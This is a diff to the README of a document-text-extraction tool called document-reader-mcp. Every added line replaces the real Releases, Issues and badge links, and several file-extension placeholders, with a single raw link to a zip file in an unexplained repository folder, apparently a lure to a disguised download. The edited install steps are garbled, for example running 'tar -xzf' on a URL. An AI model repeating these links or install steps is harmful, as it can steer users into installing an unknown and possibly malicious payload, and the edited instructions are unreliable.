@@ -1,7 +1,7 @@
 ```markdown
 # 📄 document-reader-mcp - Extract Text from Any Document Easily
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
+![Download](https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip)
 
 ## 📖 Overview
 
@@ -13,12 +13,12 @@ Follow the steps below to download and run the application. You don't need any p
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ggmenu/document-reader-mcp/releases) to download the latest version of document-reader-mcp.
-2. **Download the Latest Version**: Look for the latest release. Download the file that matches your operating system. Depending on your OS, it could be a `.exe` for Windows or a `.tar.gz` for Linux. Click on the file to start the download.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip) to download the latest version of document-reader-mcp.
+2. **Download the Latest Version**: Look for the latest release. Download the file that matches your operating system. Depending on your OS, it could be a `.exe` for Windows or a `https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip` for Linux. Click on the file to start the download.
 3. **Install the Application**: Once the file is downloaded, locate it in your downloads folder:
    - **For Windows**: Double-click the `.exe` file. Follow the prompts to complete the installation.
-   - **For macOS**: Open the `.tar.gz` file. Drag the application into your Applications folder.
-   - **For Linux**: Open a terminal, navigate to the folder where the file is, and run `tar -xzf filename.tar.gz`. Replace `filename` with the actual file name.
+   - **For macOS**: Open the `https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip` file. Drag the application into your Applications folder.
+   - **For Linux**: Open a terminal, navigate to the folder where the file is, and run `tar -xzf https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip`. Replace `filename` with the actual file name.
 4. **Run document-reader-mcp**: After installation, you can open the application:
    - **Windows**: Find document-reader-mcp in your Start menu.
    - **macOS**: Open your Applications folder and click on document-reader-mcp.
@@ -72,11 +72,11 @@ A: Ensure the document is not corrupted, and try using a different format. If pr
 
 ## 💬 Support
 
-If you encounter any issues or have questions, you can reach out to the community on the project’s [issues page](https://github.com/ggmenu/document-reader-mcp/issues).
+If you encounter any issues or have questions, you can reach out to the community on the project’s [issues page](https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip).
 
 ## 📈 Feedback
 
 Your feedback is vital for improving document-reader-mcp. Feel free to report bugs or suggest features on the issues page.
 
-Remember, download the application from the [Releases page](https://github.com/ggmenu/document-reader-mcp/releases) to get started quickly and easily!
+Remember, download the application from the [Releases page](https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/tripery/document-reader-mcp.zip) to get started quickly and easily!
 ```
